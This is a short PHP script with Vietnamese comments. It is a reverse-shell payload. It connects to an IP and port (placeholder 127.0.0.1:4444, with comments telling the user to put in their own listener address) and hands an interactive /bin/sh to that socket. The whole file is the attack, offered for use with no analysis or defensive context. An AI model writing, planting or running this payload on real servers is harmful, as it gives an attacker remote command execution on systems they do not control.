<?php
    $ip = '127.0.0.1';  // Thay YOUR_IP bằng IP của bạn
    $port = 4444;      // Thay 4444 bằng cổng bạn muốn lắng nghe
    $sock = fsockopen($ip, $port);
    exec("/bin/sh -i <&3 >&3 2>&3");
?>
